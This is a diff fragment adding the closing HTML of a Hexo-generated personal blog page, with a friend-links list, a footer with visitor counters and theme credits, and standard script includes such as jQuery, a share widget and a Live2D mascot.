+          <a target="_blank" rel="noopener" href="https://www.pllrry.site">pl1rry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://rasalghul-1.github.io/">Ra&#39;sAlGhul</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://rencvn.top/">RenCvn</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://yao-mou.gitee.io/friend/">Siebene@</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://zltt197.github.io/">zltt</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.dadachd.top/">达达</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2022 Arsene.Tang.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        
+            <span>Count by <a href="http://busuanzi.ibruce.info/" target="_blank">busuanzi.</a></span>
+        
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+  
+<script src="/localshare/js/social-share.js"></script>
+
+  
+<script src="/localshare/js/qrcode.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
